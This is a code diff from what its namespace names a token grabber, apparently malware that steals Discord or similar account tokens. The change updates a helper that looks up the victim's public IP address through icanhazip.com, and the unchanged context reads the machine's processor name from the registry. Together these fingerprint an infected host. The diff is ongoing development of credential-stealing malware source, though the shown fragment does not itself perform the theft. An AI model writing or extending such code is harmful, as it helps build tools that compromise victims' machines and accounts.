@@ -1,4 +1,4 @@
-﻿using Microsoft.Win32;
+using Microsoft.Win32;
 using System;
 using System.IO;
 using System.Management;
@@ -67,20 +67,14 @@ namespace Qvoid_Token_Grabber.Misc
                     processName = processor_name.GetValue("ProcessorNameString").ToString();
         }
 
-        public static string GetIpv4Address()
+        public static string GetPublicIpAddress()
         {
-            WebRequest request = WebRequest.Create("http://www.maip.co.il/");
-
             try
             {
-                using (WebResponse response = request.GetResponse())
-                using (StreamReader stream = new StreamReader(response.GetResponseStream()))
-                {
-                    string html = stream.ReadToEnd();
-                    return html.Substring(html.IndexOf("<body>") + 6, html.IndexOf("<br />") - html.IndexOf("<body>") + 6);
-                }
+                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://icanhazip.com");
+                return new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", "");
             }
-            catch { return string.Empty; }
+            catch { return "Error"; }
         }
 
         public static string GetLanIpv4Address()
